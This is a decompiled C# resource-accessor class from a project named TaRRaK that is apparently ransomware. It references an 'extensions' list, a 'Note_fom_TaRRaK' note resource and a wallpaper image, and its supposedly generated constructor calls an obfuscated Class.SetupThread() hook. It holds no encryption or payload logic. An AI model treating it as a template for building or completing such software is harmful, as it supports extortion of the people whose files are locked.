using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;
using PPK.NET;

namespace TaRRaK.Properties;

[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
[DebuggerNonUserCode]
[CompilerGenerated]
internal class Resources
{
	private static ResourceManager m_Order;

	private static CultureInfo m_Identifier;

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static ResourceManager ResourceManager
	{
		get
		{
			if (m_Order == null)
			{
				m_Order = new ResourceManager("TaRRaK.Properties.Resources", typeof(Resources).Assembly);
			}
			return m_Order;
		}
	}

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static CultureInfo Culture
	{
		get
		{
			return m_Identifier;
		}
		set
		{
			m_Identifier = value;
		}
	}

	internal static string extensions => ResourceManager.GetString("extensions", m_Identifier);

	internal static string Note_fom_TaRRaK => ResourceManager.GetString("Note_fom_TaRRaK", m_Identifier);

	internal static Icon tarrak => (Icon)ResourceManager.GetObject("tarrak", m_Identifier);

	internal static Bitmap wallpaper => (Bitmap)ResourceManager.GetObject("wallpaper", m_Identifier);

	internal Resources()
	{
		Class.SetupThread();
		base._002Ector();
	}
}
